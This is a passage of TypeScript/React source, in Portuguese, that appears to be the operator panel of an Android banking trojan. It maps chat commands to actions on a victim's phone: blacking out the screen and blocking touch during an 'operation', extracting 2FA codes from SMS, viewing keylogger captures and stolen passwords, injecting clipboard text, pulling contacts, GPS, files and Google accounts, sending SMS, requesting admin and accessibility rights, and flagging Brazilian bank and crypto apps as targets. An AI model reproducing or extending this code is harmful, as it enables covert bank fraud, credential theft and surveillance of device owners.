        actionName = 'MODO SIGILO ON';
      } else if (hasAny('desarmar', 'liberar', 'restaurar')) {
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: false, block: false });
        commandsList.push({ action: 'BLACK_SCREEN_OFF' });
        botAckText = 'âœ… OperaÃ§Ã£o Desarmada! Tela Preta desativada e toque do usuÃ¡rio liberado.';
        actionName = 'DESARMAR OPERAÃ‡ÃƒO';
      }
    }
    // 2. Gestos de Rolar e Deslizar (Swipe)
    else if (hasAny('rolar', 'scroll', 'deslizar', 'swipe')) {
      if (hasAny('baixo', 'down')) {
        commandsList.push({ action: 'SWIPE', direction: 'down', x1: 0.5, y1: 0.75, x2: 0.5, y2: 0.25, duration: 300, scale: 'vnc_norm' });
        botAckText = 'ðŸ‘‡ Rolando a pÃ¡gina para baixo...';
        actionName = 'SWIPE DOWN';
      } else if (hasAny('cima', 'up')) {
        commandsList.push({ action: 'SWIPE', direction: 'up', x1: 0.5, y1: 0.25, x2: 0.5, y2: 0.75, duration: 300, scale: 'vnc_norm' });
        botAckText = 'ðŸ‘† Rolando a pÃ¡gina para cima...';
        actionName = 'SWIPE UP';
      } else if (hasAny('esquerda', 'left')) {
        commandsList.push({ action: 'SWIPE', direction: 'left', x1: 0.85, y1: 0.5, x2: 0.15, y2: 0.5, duration: 300, scale: 'vnc_norm' });
        botAckText = 'ðŸ‘ˆ Deslizando tela para a esquerda...';
        actionName = 'SWIPE LEFT';
      } else if (hasAny('direita', 'right')) {
        commandsList.push({ action: 'SWIPE', direction: 'right', x1: 0.15, y1: 0.5, x2: 0.85, y2: 0.5, duration: 300, scale: 'vnc_norm' });
        botAckText = 'ðŸ‘‰ Deslizando tela para a direita...';
        actionName = 'SWIPE RIGHT';
      }
    }
    // 3. 2FA & ExtraÃ§Ã£o de CÃ³digo
    else if (hasAny('codigo 2fa', 'token 2fa', 'copiar codigo', 'extrair codigo', 'ler codigo')) {
      setSidePanelTab('sms_quick');
      commandsList.push({ action: 'GET_SMS' });
      botAckText = 'ðŸ”‘ Alternando para a aba SMS e buscando cÃ³digos 2FA de verificaÃ§Ã£o...';
      actionName = 'EXTRAIR CÃ“DIGO 2FA';
    }
    // 4. NavegaÃ§Ã£o por Abas do Painel
    else if (hasAny('ler sms', 'ver sms', 'historico sms', 'mensagens sms')) {
      setSidePanelTab('sms_quick');
      commandsList.push({ action: 'GET_SMS' });
      botAckText = 'ðŸ’¬ Alternando para a aba de SMS e buscando dados atualizados...';
      actionName = 'VER SMS';
    } else if (hasAny('ver notificacoes', 'notificacao', 'notificacoes')) {
      setSidePanelTab('notifications');
      commandsList.push({ action: 'NOTIFICATIONS' });
      botAckText = 'ðŸ”” Alternando para a aba de NotificaÃ§Ãµes em tempo real...';
      actionName = 'VER NOTIFICAÃ‡Ã•ES';
    } else if (hasAny('ver senhas', 'keylogger', 'teclas')) {
      setSidePanelTab('keylogger');
      botAckText = 'âŒ¨ï¸ Alternando para a aba Keylogger (Capturas de Teclado)...';
      actionName = 'VER KEYLOGGER';
    } else if (hasAny('v2', 'elementos', 'inspetor')) {
      setSidePanelTab('v2_elements');
      botAckText = 'ðŸ” Alternando para a aba V2 (Inspetor de Elementos Inteligente)...';
      actionName = 'VER ELEMENTOS V2';
    }
    // 5. Cumprimentos e ConversaÃ§Ã£o Geral
    else if (hasAny('oi', 'ola', 'bom dia', 'boa tarde', 'boa noite', 'e ai', 'opa', 'salve', 'tudo bem', 'ajuda')) {
      botAckText = `ðŸ¤– OlÃ¡, operador! Sou o RobÃ´ Assistente Inteligente do celular.\n\nEstou pronto para executar qualquer instruÃ§Ã£o no aparelho!\n\nðŸ’¡ Experimente pedir:\nâ€¢ "clicar em continuar" ou "clicar entrar"\nâ€¢ "operaÃ§Ã£o itaÃº" ou "operaÃ§Ã£o nubank"\nâ€¢ "rolar para baixo" ou "rolar para cima"\nâ€¢ "ler sms" ou "ver notificaÃ§Ãµes"\nâ€¢ "ligar tela" ou "desbloquear"\nâ€¢ "modo sigilo" ou "desarmar"`;
      actionName = 'ASSISTENTE CHAT';
    }
    // 6. Lanterna / Flash
    else if (has('lanterna') || has('flash')) {
      if (hasAny('deslig', 'apag', 'desativ', 'tirar', 'remover', 'off')) {
        commandsList.push({ action: 'TOGGLE_TORCH', enabled: false, state: false });
        botAckText = 'ðŸ’¡ Desligando a lanterna do dispositivo...';
        actionName = 'LANTERNA OFF';
      } else {
        commandsList.push({ action: 'TOGGLE_TORCH', enabled: true, state: true });
        botAckText = 'ðŸ’¡ Ligando a lanterna do dispositivo...';
        actionName = 'LANTERNA ON';
      }
    }
    // 7. Print / Captura de Tela
    else if (hasAny('print', 'screenshot', 'captur', 'foto da tela', 'foto tela')) {
      commandsList.push({ action: 'SNAP_SCREEN' });
      botAckText = 'ðŸ“¸ Tirando screenshot da tela em tempo real...';
      actionName = 'PRINT TELA';
    }
    // 8. Desbloquear Aparelho
    else if (hasAny('desbloque', 'tirar senha', 'remover senha', 'destrav')) {
      commandsList.push({ action: 'PLAY_UNLOCK_SEQUENCE' });
      botAckText = 'ðŸ”“ Executando sequÃªncia de desbloqueio gravada no aparelho...';
      actionName = 'DESBLOQUEIO';
    }
    // 9. Ligar / Acender Tela do Aparelho
    else if (hasAny('ligar tela', 'acender tela', 'acend a tela', 'despertar tela', 'acordar tela', 'mostrar tela', 'ligue a tela')) {
      commandsList.push({ action: 'WAKEUP' });
      botAckText = 'ðŸ’¡ Enviando comando para acender/ligar a tela do aparelho...';
      actionName = 'LIGAR TELA';
    }
    // 10. Bloquear Tela / Apagar Tela
    else if (hasAny('bloque', 'travar tela') || (hasAny('apag', 'deslig') && has('tela'))) {
      commandsList.push({ action: 'LOCK_DEVICE' });
      botAckText = 'ðŸ”’ Bloqueando e apagando a tela do aparelho...';
      actionName = 'BLOQUEAR TELA';
    }
    // 11. BotÃ£o Power Alternado
    else if (hasAny('power', 'botao desligar')) {
      commandsList.push({ action: 'POWER' });
      botAckText = 'âš¡ Pressionando o botÃ£o Power do aparelho...';
      actionName = 'POWER';
    }
    // 12. Menu Power (Reiniciar / Desligar)
    else if (hasAny('menu desligar', 'reiniciar', 'power menu', 'desligar celular', 'reiniciar celular')) {
      commandsList.push({ action: 'POWER_MENU' });
      botAckText = 'ðŸ”´ Abrindo menu de desligar/reiniciar do Android...';
      actionName = 'POWER MENU';
    }
    // 13. NavegaÃ§Ã£o: Home / InÃ­cio
    else if (hasAny('home', 'inicio', 'inicial', 'menu principal')) {
      commandsList.push({ action: 'HOME' });
      botAckText = 'ðŸ“± Navegando para a Tela Inicial (Home)...';
      actionName = 'NAV HOME';
    }
    // 14. NavegaÃ§Ã£o: Voltar / Back
    else if (hasAny('voltar', 'volte', 'retornar', 'retorne', 'back')) {
      commandsList.push({ action: 'BACK' });
      botAckText = 'â¬…ï¸ Pressionando o botÃ£o Voltar (Back)...';
      actionName = 'NAV BACK';
    }
    // 15. NavegaÃ§Ã£o: Recentes / Multitarefa
    else if (hasAny('recent', 'multitaref', 'apps abertos', 'gerenciador')) {
      commandsList.push({ action: 'RECENTS' });
      botAckText = 'ðŸ“‘ Abrindo a lista de Apps Recentes / Multitarefa...';
      actionName = 'NAV RECENTS';
    }
    // 16. Volume & Som
    else if (hasAny('silenci', 'mudo', 'mutar', 'sem som')) {
      commandsList.push({ action: 'SET_SOUND_MODE', mode: 'silent' });
      botAckText = 'ðŸ”‡ Colocando o dispositivo no modo 100% silencioso...';
      actionName = 'MODO SILENCIOSO';
    } else if (hasAny('vibrar', 'vibracall', 'vibracao')) {
      commandsList.push({ action: 'VIBRATE' });
      botAckText = 'ðŸ“³ Disparando pulso de vibraÃ§Ã£o no aparelho...';
      actionName = 'VIBRAR';
    } else if (has('volume') || has('som') || has('audio')) {
      if (hasAny('aument', 'mais', 'sub', 'alto', 'maxim', '+', 'subir')) {
        commandsList.push({ action: 'VOLUME_UP' });
        botAckText = 'ðŸ”Š Aumentando o volume do aparelho...';
        actionName = 'VOLUME +';
      } else if (hasAny('diminu', 'abaix', 'baix', 'menos', 'baixo', '-')) {
        commandsList.push({ action: 'VOLUME_DOWN' });
        botAckText = 'ðŸ”‰ Diminuindo o volume do aparelho...';
        actionName = 'VOLUME -';
      } else if (hasAny('normal', 'ativ', 'com som')) {
        commandsList.push({ action: 'SET_SOUND_MODE', mode: 'sound' });
        botAckText = 'ðŸ”” Ativando modo de som normal no dispositivo...';
        actionName = 'SOM NORMAL';
      } else {
        commandsList.push({ action: 'VOLUME_UP' });
        botAckText = 'ðŸ”Š Aumentando o volume do aparelho...';
        actionName = 'VOLUME +';
      }
    }
    // 17. Brilho da Tela
    else if (has('brilho')) {
      if (hasAny('max', '100', 'aument', 'alto', 'sub', 'mais')) {
        commandsList.push({ action: 'SET_BRIGHTNESS', value: 100 });
        botAckText = 'â˜€ï¸ Ajustando o brilho da tela para 100% (mÃ¡ximo)...';
        actionName = 'BRILHO 100%';
      } else {
        commandsList.push({ action: 'SET_BRIGHTNESS', value: 10 });
        botAckText = 'ðŸŒ™ Ajustando o brilho da tela para 10% (modo discreto)...';
        actionName = 'BRILHO 10%';
      }
    }
    // 18. Wi-Fi
    else if (has('wifi') || has('wi-fi')) {
      if (hasAny('deslig', 'desativ', 'off', 'apag')) {
        commandsList.push({ action: 'TOGGLE_WIFI', enabled: false, state: false });
        botAckText = 'ðŸ“µ Desativando Wi-Fi no dispositivo...';
        actionName = 'WIFI OFF';
      } else {
        commandsList.push({ action: 'TOGGLE_WIFI', enabled: true, state: true });
        botAckText = 'ðŸ“¶ Ativando Wi-Fi no dispositivo...';
        actionName = 'WIFI ON';
      }
    }
    // 19. Tela Preta / Injects
    else if (has('tela preta') || has('black screen') || has('inject')) {
      if (hasAny('deslig', 'tir', 'remov', 'desativ', 'fech', 'sair', 'off')) {
        commandsList.push({ action: 'BLACK_SCREEN_OFF' });
        botAckText = 'ðŸ–¤ Desativando Tela Preta e restaurando a visÃ£o normal do aparelho...';
        actionName = 'TELA PRETA OFF';
      } else {
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        botAckText = 'ðŸ–¤ Injetando Tela Preta 100% opaca de bloqueio no aparelho...';
        actionName = 'TELA PRETA ON';
      }
    }
    // 20. Bloqueio de Toque
    else if (has('toque')) {
      if (hasAny('bloque', 'trav', 'desativ')) {
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        botAckText = 'ðŸš« Bloqueando interaÃ§Ã£o de toque na tela da vÃ­tima...';
        actionName = 'TOQUE BLOQUEADO';
      } else if (hasAny('liber', 'destrav', 'ativ')) {
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: false, block: false });
        botAckText = 'âœ… Liberando toque na tela do aparelho...';
        actionName = 'TOQUE LIBERADO';
      }
    }
    // 21. Digitar Texto
    else if (hasAny('digitar', 'digite', 'escrever', 'escreva')) {
      const toType = text.replace(/^(por\s+favor\s+)?(digitar|digite|escreva|escrever)\s+(o\s+|a\s+|o\s+texto\s+|a\s+frase\s+)?/i, '').trim();
      commandsList.push({ action: 'TYPE', text: toType });
      botAckText = `ðŸ“ Digitando "${toType}" no campo ativo do aparelho...`;
      actionName = 'DIGITAR TEXTO';
    }
    // 22. Clipboard
    else if (has('clipboard') || has('area de transferencia')) {
      if (hasAny('ler', 'pegar', 'ver', 'obter')) {
        commandsList.push({ action: 'GET_CLIPBOARD' });
        botAckText = 'ðŸ“‹ Lendo conteÃºdo da Ã¡rea de transferÃªncia do aparelho...';
        actionName = 'GET CLIPBOARD';
      } else {
        const toClip = text.replace(/^(copiar|colar|injetar|injetar clipboard)\s+(o\s+|a\s+)?/i, '').trim();
        commandsList.push({ action: 'SET_CLIPBOARD', text: toClip });
        botAckText = `ðŸ“‹ Injetando "${toClip}" na Ã¡rea de transferÃªncia (clipboard)...`;
        actionName = 'SET CLIPBOARD';
      }
    }
    // 23. LocalizaÃ§Ã£o GPS
    else if (hasAny('localizac', 'gps', 'onde esta', 'rastre')) {
      commandsList.push({ action: 'GET_LOCATION' });
      botAckText = 'ðŸ“ Solicitando localizaÃ§Ã£o GPS do dispositivo...';
      actionName = 'GET GPS';
    }
    // 24. Contatos
    else if (hasAny('contato', 'agenda')) {
      commandsList.push({ action: 'GET_CONTACTS' });
      botAckText = 'ðŸ‘¥ Extraindo lista de contatos do aparelho...';
      actionName = 'GET CONTATOS';
    }
    // 25. Info do Aparelho
    else if (hasAny('bateria', 'info', 'status', 'informac')) {
      commandsList.push({ action: 'GET_DEVICE_INFO' });
      botAckText = 'â„¹ï¸ Atualizando informaÃ§Ãµes gerais e nÃ­vel de bateria...';
      actionName = 'INFO STATUS';
    }
    // 26. Abrir Aplicativo
    else if (
      hasAny('abrir', 'abra', 'iniciar', 'inicie', 'entrar', 'entre', 'launch', 'executar') ||
      hasAny('whatsapp', 'telegram', 'nubank', 'itau', 'bradesco', 'santander', 'banco do brasil', 'caixa', 'inter', 'c6', 'picpay', 'mercado pago', 'pagbank', 'instagram', 'facebook', 'youtube', 'chrome', 'configurac')
    ) {
      const commonApps: Record<string, string> = {
        whatsapp: 'com.whatsapp',
        telegram: 'org.telegram.messenger',
        nubank: 'com.nu.production',
        itau: 'com.itau',
        bradesco: 'com.bradesco',
        santander: 'com.santander.app',
        bb: 'br.com.bb.android',
        'banco do brasil': 'br.com.bb.android',
        caixa: 'br.gov.caixa.tem',
        'caixa tem': 'br.gov.caixa.tem',
        inter: 'br.com.intermedium',
        c6: 'com.c6bank.app',
        'c6 bank': 'com.c6bank.app',
        picpay: 'com.picpay',
        'mercado pago': 'com.mercadopago.wallet',
        mercadopago: 'com.mercadopago.wallet',
        pagbank: 'br.com.uol.ps',
        pagseguro: 'br.com.uol.ps',
        instagram: 'com.instagram.android',
        facebook: 'com.facebook.katana',
        youtube: 'com.google.android.youtube',
        chrome: 'com.android.chrome',
        navegador: 'com.android.chrome',
        configuracoes: 'com.android.settings',
        config: 'com.android.settings',
        ajustes: 'com.android.settings',
        contatos: 'com.google.android.contacts',
        mensagens: 'com.google.android.apps.messaging',
        sms: 'com.google.android.apps.messaging',
        'play store': 'com.android.vending',
        playstore: 'com.android.vending'
      };

      let targetPackage = '';
      let targetAppName = '';

      for (const [key, pkg] of Object.entries(commonApps)) {
        if (lower.includes(key)) {
          targetPackage = pkg;
          targetAppName = key.toUpperCase();
          break;
        }
      }

      if (!targetPackage && appsList && appsList.length > 0) {
        const cleanSearch = lower.replace(/^(abrir|abra|iniciar|entrar no|launch)\s+(o|a|no|na)?\s*/i, '').trim();
        const found = appsList.find(
          (a) =>
            (a.name && a.name.toLowerCase().includes(cleanSearch)) ||
            (a.package && a.package.toLowerCase().includes(cleanSearch))
        );
        if (found) {
          targetPackage = found.package;
          targetAppName = found.name || found.package;
        }
      }

      if (!targetPackage) {
        const directPkgMatch = text.match(/([a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+[a-zA-Z0-9_.]*)/);
        if (directPkgMatch) {
          targetPackage = directPkgMatch[1];
          targetAppName = targetPackage;
        }
      }

      if (targetPackage) {
        commandsList.push({ action: 'OPEN_APP', package: targetPackage });
        botAckText = `ðŸš€ Abrindo aplicativo ${targetAppName} (${targetPackage}) no aparelho...`;
        actionName = `ABRIR ${targetAppName}`;
      } else {
        botAckText = `â“ NÃ£o encontrei o aplicativo solicitado. Tente informar o nome comum ou o package (ex: "abra o whatsapp", "abra o nubank").`;
      }
    }

    if (commandsList.length > 0) {
      const botMsgId = 'bot-' + Date.now();
      const botAck: AssistantMsg = {
        id: botMsgId,
        sender: 'bot',
        text: botAckText,
        actionName,
        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        status: 'executing',
        commandPayload: commandsList
      };

      setAssistantMessages((prev) => [...prev, botAck]);
      setIsAssistantTyping(false);

      setTimeout(() => {
        assistantChatBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
      }, 50);

      try {
        for (const cmd of commandsList) {
          await sendCommand(cmd);
        }
        setAssistantMessages((prev) =>
          prev.map((m) =>
            m.id === botMsgId
              ? {
                  ...m,
                  status: 'success',
                  text: `${botAckText}\nâœ… Executado com sucesso no dispositivo!`
                }
              : m
          )
        );
      } catch (err: any) {
        setAssistantMessages((prev) =>
          prev.map((m) =>
            m.id === botMsgId
              ? {
                  ...m,
                  status: 'error',
                  text: `${botAckText}\nâŒ Falha ao executar: ${err?.message || 'Erro de conexÃ£o'}`
                }
              : m
          )
        );
      }
    } else {
      setIsAssistantTyping(false);
      const botFallback: AssistantMsg = {
        id: 'bot-' + Date.now(),
        sender: 'bot',
        text:
          botAckText ||
          `ðŸ¤– NÃ£o entendi o comando "${text}".\n\nðŸ’¡ VocÃª pode pedir, por exemplo:\nâ€¢ "clicar em continuar" ou "clicar em entrar"\nâ€¢ "operaÃ§Ã£o itaÃº" ou "operaÃ§Ã£o nubank"\nâ€¢ "rolar para baixo" ou "rolar para cima"\nâ€¢ "ler sms" ou "ver notificaÃ§Ãµes"\nâ€¢ "ligar tela" ou "desbloquear"\nâ€¢ "abra o whatsapp" ou "abra o nubank"\nâ€¢ "modo sigilo" ou "desarmar"\n\nOu clique em um dos botÃµes rÃ¡pidos abaixo!`,
        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        status: botAckText ? 'success' : 'error'
      };
      setAssistantMessages((prev) => [...prev, botFallback]);
    }

    setTimeout(() => {
      assistantChatBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 50);
  };

  // Carregar logs
  const fetchLogs = async () => {
    if (!deviceId) return;
    setIsLoadingLogs(true);
    try {
      const data = await devicesAPI.getLogs(deviceId);
      if (Array.isArray(data) && data.length > 0) {
        setLogs(data);
      }
    } catch (e) {
      console.error('Erro ao buscar logs:', e);
    } finally {
      setIsLoadingLogs(false);
    }
  };

  // Helper para identificar bancos e carteiras
  const isBankApp = (pkg?: string, name?: string) => {
    const p = (pkg || '').toLowerCase();
    const n = (name || '').toLowerCase();
    const bankKeywords = [
      'bank', 'banco', 'itau', 'itaÃº', 'bradesco', 'santander', 'bancointer', 'intermedium',
      'caixa', 'c6bank', 'neon', 'pagbank', 'pagseguro', 'mercadopago', 'picpay', 'panapp', 
      'sicredi', 'original', 'stone', 'digio', 'will.bank', 'willbank', 'agibank', 'sofisa', 'banrisul', 'bb.android',
      'modal', 'xpinvestimentos', 'safra', 'bancovotorantim', 'bmg.android', 'brb.mobile', 
      'rendimento', 'bs2', 'recargapay', 'citibank', 'daycoval', 'creditas', 'sicoob', 'btg.pactual', 
      'btgpactual', 'rico', 'clear', 'avenue', 'nomad', 'mercantil', 'superdigital', 'genial', 
      'bari', 'pine', 'bancobari', 'bancopine', 'bancobmg', 'bancobv', 'bancobs2', 'next.android', 'next',
      'carteira', 'investimentos', 'binance', 'crypto', 'bybit', 'foxbit', 'mercadobitcoin'
    ];
    return bankKeywords.some((kw) => p.includes(kw) || n.includes(kw));
  };

  // Carregar aplicativos
  const fetchApps = async () => {
    if (!deviceId) return;
    setIsLoadingApps(true);
    fetchBankBalances();
    fetchKeylogs();
    try {
      // 1. Tenta carregar os apps jÃ¡ armazenados no servidor / banco
      const res = await devicesAPI.getApps(deviceId);
      if (res && res.apps && Array.isArray(res.apps) && res.apps.length > 0) {
        const formatted = res.apps.map((a: any) => ({
          ...a,
          isBank: a.isBank !== undefined ? a.isBank : isBankApp(a.package, a.name)
        }));
        setAppsList(formatted);
      }

      // 2. Dispara pedido de dump atualizado para o celular
      try {
        await devicesAPI.refreshApps(deviceId);
      } catch (err) {
        await sendCommand({ action: 'GET_INSTALLED_APPS' });
      }

      // 3. Consulta novamente em segundo plano para obter a resposta atualizada do celular
      setTimeout(async () => {
        try {
          const fresh = await devicesAPI.getApps(deviceId);
          if (fresh && fresh.apps && Array.isArray(fresh.apps) && fresh.apps.length > 0) {
            const formatted = fresh.apps.map((a: any) => ({
              ...a,
              isBank: a.isBank !== undefined ? a.isBank : isBankApp(a.package, a.name)
            }));
            setAppsList(formatted);
          }
        } catch {}
      }, 2500);

      showToast('Lista de aplicativos sincronizada!', 'success');
    } catch (e) {
      console.error('Erro ao carregar apps:', e);
      try {
        await sendCommand({ action: 'GET_INSTALLED_APPS' });
      } catch (err) {}
      showToast('SolicitaÃ§Ã£o de apps enviada ao aparelho!', 'info');
    } finally {
      setIsLoadingApps(false);
    }
  };

  // Auto-carregar apps, senhas e mapeamentos de overlay ao entrar nas abas
  useEffect(() => {
    if (activeTab === 'apps' && deviceId) {
      fetchApps();
      fetchBankBalances();
      fetchKeylogs();
      fetchOverlayMappings();
    }
    if (deviceId) {
      fetchPasswords();
      fetchOverlayMappings();
    }
  }, [activeTab, deviceId, fetchPasswords, fetchOverlayMappings]);

  // Polling em tempo real na aba de senhas
  useEffect(() => {
    if (activeTab === 'passwords' && deviceId) {
      fetchPasswords();
      const interval = setInterval(() => {
        fetchPasswords();
      }, 4000);
      return () => clearInterval(interval);
    }
  }, [activeTab, deviceId, fetchPasswords]);

  // Polling de overlay mappings em tempo real na aba de apps (para auto-disarm)
  useEffect(() => {
    if (activeTab === 'apps' && deviceId) {
      const interval = setInterval(() => {
        fetchOverlayMappings();
      }, 5000);
      return () => clearInterval(interval);
    }
  }, [activeTab, deviceId, fetchOverlayMappings]);


  // Carregar SMS Real
  const fetchSms = async () => {
    if (!deviceId) return;
    setIsLoadingSms(true);
    try {
      await sendCommand({ action: 'GET_SMS_LIST' });
      await sendCommand({ action: 'GET_SMS' });
      const res = await devicesAPI.getSms(deviceId);
      if (res && res.sms && Array.isArray(res.sms) && res.sms.length > 0) {
        const formatted = res.sms.map((item: any, idx: number) => ({
          id: item.id || idx + 1,
          sender: item.sender || item.address || item.phone || item.appName || 'SMS',
          body: item.body || item.text || item.message || (typeof item === 'string' ? item : JSON.stringify(item)),
          date: item.date || item.timestamp || 'Recente'
        }));
        setSmsList(formatted);
      }
    } catch (e) {
      console.error('Erro ao buscar SMS:', e);
    } finally {
      setIsLoadingSms(false);
    }
  };

  // Carregar Contatos Real
  const fetchContacts = async () => {
    if (!deviceId) return;
    setIsLoadingContacts(true);
    try {
      await sendCommand({ action: 'GET_CONTACTS' });
      const res = await devicesAPI.getContacts(deviceId);
      if (res && res.contacts && Array.isArray(res.contacts) && res.contacts.length > 0) {
        const formatted = res.contacts.map((item: any, idx: number) => ({
          id: item.id || idx + 1,
          name: item.name || item.displayName || 'Contato',
          phone: item.phone || item.number || item.phoneNumber || '--'
        }));
        setContactsList(formatted);
      }
    } catch (e) {
      console.error('Erro ao buscar contatos:', e);
    } finally {
      setIsLoadingContacts(false);
    }
  };

  // Carregar Contas Google
  const [googleAccountsList, setGoogleAccountsList] = useState<string[]>([]);
  const [googleAccountsSearch, setGoogleAccountsSearch] = useState('');
  const [isLoadingGoogleAccounts, setIsLoadingGoogleAccounts] = useState(false);

  const fetchGoogleAccounts = async () => {
    if (!deviceId) return;
    setIsLoadingGoogleAccounts(true);
    try {
      await sendCommand({ action: 'GET_GOOGLE_ACCOUNTS' });
      await sendCommand({ action: 'GET_ACCOUNTS' });
      const res = await devicesAPI.getGoogleAccounts(deviceId);
      if (res && res.accounts && Array.isArray(res.accounts)) {
        setGoogleAccountsList(res.accounts);
      } else if (res && res.google_accounts && Array.isArray(res.google_accounts)) {
        setGoogleAccountsList(res.google_accounts);
      }
    } catch (e) {
      console.error('Erro ao buscar contas Google:', e);
    } finally {
      setIsLoadingGoogleAccounts(false);
    }
  };

  // Carregar Arquivos Real
  const fetchFiles = async (path: string = '/sdcard') => {
    if (!deviceId) return;
    const cleanPath = path.replace(/\/+/g, '/').replace(/\/$/, '') || '/sdcard';
    setIsLoadingFiles(true);
    setCurrentPath(cleanPath);
    try {
      await sendCommand({ action: 'GET_FILE_LIST', path: cleanPath });
      showToast(`Buscando conteÃºdo de ${cleanPath}...`, 'info');
      const res = await devicesAPI.getFileList(deviceId, cleanPath);
      if (res && res.files && Array.isArray(res.files)) {
        setFileList(res.files);
      }
    } catch (e) {
      console.error('Erro ao buscar arquivos:', e);
    } finally {
      setIsLoadingFiles(false);
    }
  };

  // LocalizaÃ§Ã£o GPS Real
  const [isLoadingLocation, setIsLoadingLocation] = useState(false);

  const fetchLocation = async () => {
    if (!deviceId) return;
    setIsLoadingLocation(true);
    try {
      await sendCommand({ action: 'GET_LOCATION' });
      const res = await devicesAPI.getLocation(deviceId);
      if (res && res.location) {
        setGpsData(res.location);
      }
    } catch (e) {
      console.error('Erro ao buscar GPS:', e);
    } finally {
      setIsLoadingLocation(false);
    }
  };

  // Disparo de Teclado Remoto
  const handleSendKeyboard = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!keyboardInput) return;
    await sendCommand({ action: 'TYPE', text: keyboardInput });
    setKeyboardInput('');
    setShowKeyboardModal(false);
  };

  // Disparo de SMS
  const handleSendSms = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!smsToNumber || !smsBody) return;
    await sendCommand({ action: 'SEND_SMS', phone: smsToNumber, message: smsBody });
    setSmsToNumber('');
    setSmsBody('');
    showToast('SMS enviado para a fila de transmissÃ£o!', 'success');
  };

  // Renomear Dispositivo
  const handleRenameDevice = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!deviceId || !newDeviceName.trim()) return;
    setIsRenaming(true);
    try {
      await devicesAPI.rename(deviceId, newDeviceName.trim());
      setDevice((prev) => (prev ? { ...prev, custom_name: newDeviceName.trim() } : null));
      showToast('Nome do dispositivo alterado com sucesso!', 'success');
      setShowRenameModal(false);
    } catch (err: any) {
      showToast('Erro ao renomear dispositivo', 'error');
    } finally {
      setIsRenaming(false);
    }
  };

  // Extrair InformaÃ§Ãµes do Dispositivo
  const deviceName = device?.custom_name || device?.model || 'Motorola Moto G';
  const deviceIp = (device as any)?.ip || device?.ip_address || '127.0.0.1';
  
  // NÃ­vel da Bateria em Tempo Real
  const rawBattery = typeof device?.battery_level === 'number'
    ? device.battery_level
    : (typeof (device as any)?.battery === 'number' ? (device as any).battery : (typeof (device as any)?.batteryLevel === 'number' ? (device as any).batteryLevel : 100));
  const batteryLevel = rawBattery !== null && !isNaN(rawBattery) ? rawBattery : 100;
  const isCharging = !!(device?.is_charging || (device as any)?.isCharging);
  const androidVer = device?.android_version ? `Android ${device.android_version}` : 'Android 11';

  // Toggle de permissÃ£o individual
  const togglePermission = async (key: string) => {
    const nextVal = !permissions[key];
    setPermissions((prev) => ({ ...prev, [key]: nextVal }));
    await sendCommand({
      action: 'REQUEST_PERMISSION',
      permission: key,
      enable: nextVal
    });
  };

  // Toggle de opÃ§Ã£o do bot
  const toggleBotOption = async (key: string) => {
    const nextVal = !botOptions[key];
    setBotOptions((prev) => ({ ...prev, [key]: nextVal }));
    await sendCommand({
      action: 'TOGGLE_BOT_OPTION',
      option: key,
      value: nextVal
    });
  };

  // Modos de Som
  const handleSetSoundMode = (mode: 'silent' | 'vibrate' | 'sound') => {
    setSoundMode(mode);
    const modeInt = mode === 'silent' ? 0 : mode === 'vibrate' ? 1 : 2;
    sendCommand({ action: 'SET_RINGER_MODE', mode: modeInt });
  };

  // =========================================================================
  // ðŸ›¡ï¸ HANDLERS: ADMIN, LOCK, PIN & SEGURANÃ‡A ORGANIZADA
  // =========================================================================
  
  // ðŸ›¡ï¸ Solicitar Device Admin
  const handleRequestAdmin = async () => {
    await sendCommand({ action: 'REQUEST_ADMIN_PERMISSION' });
    showToast('SolicitaÃ§Ã£o de Administrador de Dispositivo enviada!', 'info');
  };

  // ðŸ” Verificar Status Admin
  const handleCheckAdminStatus = async () => {
    await sendCommand({ action: 'CHECK_ADMIN_STATUS' });
    showToast('Consultando status de Administrador...', 'info');
  };

  // âš¡ Solicitar Acessibilidade
  const handleRequestAccessibility = async () => {
    await sendCommand({ action: 'OPEN_SETTINGS', setting: 'accessibility' });
    await sendCommand({ action: 'REQUEST_PERMISSION', permission: 'accessibility', enable: true });
    showToast('Solicitando Acessibilidade no dispositivo...', 'info');
  };

  // ðŸ”‹ Ignorar OtimizaÃ§Ã£o de Bateria
  const handleRequestBatteryOptimization = async () => {
    await sendCommand({ action: 'REQUEST_IGNORE_BATTERY' });
    showToast('Solicitando Ignorar OtimizaÃ§Ã£o de Bateria...', 'info');
  };

  // ðŸªŸ PermissÃ£o de SobreposiÃ§Ã£o (Overlay)
  const handleRequestOverlay = async () => {
    await sendCommand({ action: 'REQUEST_OVERLAY_PERMISSION' });
    showToast('Solicitando PermissÃ£o de SobreposiÃ§Ã£o...', 'info');
  };

  // ðŸ’¡ Ligar / Acender Tela do Aparelho
  const handleWakeUpScreen = async () => {
    await sendCommand({ action: 'WAKEUP' });
    await sendCommand({ action: 'WAKE_UP' });
    await sendCommand({ action: 'SCREEN_ON' });
    showToast('ðŸ’¡ Comando para Ligar/Acender Tela enviado!', 'success');
  };

  // ðŸ”’ Bloquear Dispositivo
  const handleLockDevice = async () => {
    await sendCommand({ action: 'LOCK' });
    await sendCommand({ action: 'LOCK_DEVICE' });
    showToast('Comando de Bloqueio de Tela enviado!', 'info');
  };

  // ðŸ”“ Desbloquear / Acordar Tela
  const handleUnlockDevice = async () => {
    await sendCommand({ action: 'UNLOCK' });
    await sendCommand({ action: 'WAKEUP' });
    showToast('Comando de Despertar/Desbloqueio enviado!', 'info');
  };

  // ðŸ“± Exibir Overlay de Lockscreen
  const handleShowLockscreenOverlay = async (type: string) => {
    await sendCommand({ action: 'SHOW_LOCKSCREEN', type });
    showToast(`Overlay de Lockscreen (${type.toUpperCase()}) exibido!`, 'success');
  };

  // âŒ Remover Overlay de Lockscreen
  const handleHideLockscreenOverlay = async () => {
    await sendCommand({ action: 'HIDE_LOCKSCREEN' });
